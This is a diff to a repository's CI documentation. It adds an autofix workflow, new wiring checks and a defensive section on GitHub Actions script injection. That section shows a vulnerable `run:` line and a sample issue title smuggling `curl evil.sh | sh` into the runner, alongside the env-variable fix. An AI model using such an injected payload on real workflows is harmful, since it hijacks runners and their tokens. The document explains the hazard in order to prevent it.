@@ -119,7 +119,8 @@ this whole thing exists to avoid.
 | **manual** (`workflow_dispatch` on [`review.yml`](../../.github/workflows/review.yml)) | both lenses on any ref, with an optional `base` input | same as a push run |
 | any push or PR ([`ci.yml`](../../.github/workflows/ci.yml)) | `npm run test:review` and `npm run test:agent` — the fixtures for all of this, because a tool that judges (or writes) changes has to be judged by something too | CI red |
 | an issue labelled `agent:go`, or a `/agent` comment ([`agent-dispatch.yml`](../../.github/workflows/agent-dispatch.yml)) | a model proposes a change; the guard refuses protected paths before anything is written | the run goes red and no branch is pushed — see [Dispatch](#dispatch--an-issue-becomes-a-proposed-change) |
-| any push or PR ([`ci.yml`](../../.github/workflows/ci.yml)) | `npm run review:gate` · `npm run security:actions` · `npm run hooks:check` — the three checks that the gate is still *wired* (below) | CI red |
+| any push or PR ([`ci.yml`](../../.github/workflows/ci.yml)) | `npm run review:gate` · `npm run security:actions` · `npm run hooks:check` · `npm run guidance:check` — the checks that the gate, and the guidance an agent reads before touching it, are still *wired* (below) | CI red |
+| pull request ([`autofix.yml`](../../.github/workflows/autofix.yml)) | the lens that WRITES: `eslint --fix` and `ruff --fix` are applied to the branch (below) | never red — it spends the fix, it does not add an opinion |
 
 Run the review by hand from the Actions tab (**Review → Run workflow**) after
 adding `ANTHROPIC_API_KEY`, after editing `.claude/CLAUDE.md` or an ADR — the
@@ -191,6 +192,39 @@ Caps and refusals, all with fixtures in `npm run test:agent`: at most 25 files a
 held to the same rule the CHANGELOG is cut from (`checkSubject`, imported from the
 release machinery rather than copied).
 
+## Lens 3 — autofix (the one that writes)
+
+Both lenses above can only say no. The class of finding with exactly one correct
+answer and no judgement in it — an unused import, an f-string with no
+placeholder, any lint rule carrying a machine-applicable fix — was coming back to
+the maintainer as a review comment, which is the most expensive way in this
+repository to move a character.
+
+[`autofix.yml`](../../.github/workflows/autofix.yml) runs on every pull request
+from this repository (a fork's PR gets a read-only token, so it is skipped there)
+and applies exactly two things:
+
+| Fixer | Scope | Why this much |
+| --- | --- | --- |
+| `eslint --fix` | the whole tree | everything `npm run lint` would block on and can repair itself. CI still blocks on the rest |
+| `ruff check --fix --select F401,F541` | `pipeline/` | the two entries [`ruff.toml`](../../ruff.toml) enumerates as debt with *"(auto-fixable)"* beside them. They are **ignored** by the gate, so CI is green while they accumulate — this is the only thing that burns them down. Safe fixes only (ruff's default): an F401 removal ruff calls unsafe, such as a re-export in an `__init__.py`, is left alone |
+
+Not included, deliberately: `ruff format`. This tree has never been
+formatter-owned, and a job whose first act is to reformat the whole pipeline is a
+job that gets switched off.
+
+**How the result lands** is the same rule as
+[dispatch](#dispatch--an-issue-becomes-a-proposed-change) and `pin-actions`. With
+an `AUTOFIX_TOKEN` secret (a PAT with `contents: write`) the fix is committed to
+the PR branch as one `style:` commit, and the push re-triggers every check. With
+no token it posts the patch on the pull request, prints it in the job summary,
+and says that nothing was applied — because a commit pushed by the default
+`GITHUB_TOKEN` triggers no workflows, and a PR displaying the checks of code it
+no longer contains is worse than the lint findings it fixed.
+
+The job never fails the build: everything it can fix is either already gated by
+`npm run lint` or is documented debt in `ruff.toml`.
+
 ## Keeping the gate wired
 
 A gate stops being one long before anyone deletes it. The three checks below run
@@ -199,12 +233,68 @@ in `ci.yml` on every push and PR and cost under a second between them.
 | Check | Catches |
 | --- | --- |
 | `npm run review:gate` ([`gate-check.mjs`](../../scripts/review/gate-check.mjs)) | the ruleset requiring a check name no job reports — rename `Agent review (judgement)` and GitHub waits forever for a check that never arrives, until someone drops the requirement to unblock a PR. Also: an `evaluate`-mode ruleset, a required check that never runs on PRs, a lens that left the required set, a workflow with no jobs |
-| `npm run security:actions` ([`check-actions.mjs`](../../scripts/security/check-actions.mjs)) | a workflow with no top-level `permissions:` block, and any **new** action pinned to a mutable tag. A ratchet: the refs that already float are enumerated with why in [`.github/actions-pin-allowlist.json`](../../.github/actions-pin-allowlist.json), so the list can only shrink — and a list that fails to load excuses nothing rather than everything |
-| `npm run hooks:check` ([`install.mjs`](../../scripts/hooks/install.mjs)) | a hook that vanished, or one still shelling out to an npm script or file that was renamed away — the shape of drift that leaves `pre-push` running and no longer checking |
+| `npm run security:actions` ([`check-actions.mjs`](../../scripts/security/check-actions.mjs)) | a workflow with no top-level `permissions:` block; any **new** action pinned to a mutable tag; and any `${{ … }}` substituted into a `run:` script (below). A ratchet: the refs that already float are enumerated with why in [`.github/actions-pin-allowlist.json`](../../.github/actions-pin-allowlist.json), so the list can only shrink — and a list that fails to load excuses nothing rather than everything |
+| `npm run hooks:check` ([`install.mjs`](../../scripts/hooks/install.mjs)) | a hook that vanished, or one still shelling out to an npm script or file that was renamed away — the shape of drift that leaves `pre-push` running and no longer checking. Also: a `prepare` that swallows its own failure (below), and a Dockerfile that runs `npm ci` without the installer in the build context |
 
 `npm run review:gate -- --verify` is the online half: it asks GitHub whether the
 ruleset is actually applied. Without a token it prints **THE LIVE HALF DID NOT
 RUN** and exits 0, for the same reason lens 2 does.
+
+### `prepare` may not swallow its own failure
+
+`package.json`'s `prepare` was `node scripts/hooks/install.mjs || exit 0` for as
+long as the hooks existed. That operator collapses three different outcomes into
+one silent success: *installed*, *could not install and here is why*, and *the
+installer was not even there*. A contributor whose hooks never wired looked
+exactly like one whose did, and pushed straight past a gate they believed was on.
+
+The `||` is gone. The non-fatal guarantee — `prepare` must never break `npm ci`
+in CI or in the Docker build — now lives in `install.mjs`'s own `catch`, which
+**prints what happened** and then exits 0. A shell operator cannot print.
+
+That removal has one coupling, and it is the reason the swallow survived so long:
+the image runs `npm ci` (and so `prepare`) against a build context holding only
+`package.json` and the lockfile, so a `prepare` that can fail on a missing module
+would break `docker build` and nothing else — discovered at release time, by an
+operator. The [`Dockerfile`](../../Dockerfile) now copies `scripts/hooks` above
+that line, and `hooks:check` fails if that `COPY` ever moves below it
+(`docker-npm-ci-without-installer`).
+
+### Nothing an outsider writes reaches a shell (`run-injection`)
+
+`${{ … }}` is not a shell variable. Actions substitutes the expression into the
+script **text** before bash is started, so
+
+```yaml
+run: echo "${{ github.event.issue.title }}"   # never do this
+```
+
+runs an issue titled ``x"; curl evil.sh | sh; #`` on the runner with that job's
+token. This repository dispatches agents from issue text
+([`agent-dispatch.yml`](../../.github/workflows/agent-dispatch.yml)) and publishes
+a signed image ([`release.yml`](../../.github/workflows/release.yml)), so that is
+one line between a stranger's text and the supply chain.
+
+The rule the ratchet enforces: **only fixed-shape, repo-controlled contexts may
+appear in a `run:` script.** `TRUSTED_IN_RUN` in `check-actions.mjs` is that
+list — `github.repository`, `github.sha`, `github.event_name`, `runner.*`,
+`matrix.*` and a few more. Everything else is blocking, including all of
+`github.event.*` (payload), `inputs.*`, and `steps.*.outputs.*` / `needs.*`,
+which are only as trusted as the step that wrote them. The fix is always the
+same shape, and it is what every workflow here now does:
+
+```yaml
+env:
+  TITLE: ${{ github.event.issue.title }}   # expansion happens in YAML…
+run: echo "$TITLE"                         # …bash only ever sees a value
+```
+
+The reader handles both `run:` forms (inline scalar and block scalar) and
+deliberately does **not** count an adjoining `env:` block as script — otherwise
+the fix would report as the bug. Fixtures, including one that walks every
+workflow in the tree, are in
+[`gate-check.test.mjs`](../../scripts/review/__tests__/gate-check.test.mjs)
+(`npm run test:review`).
 
 ### Burning the pinning debt down
 
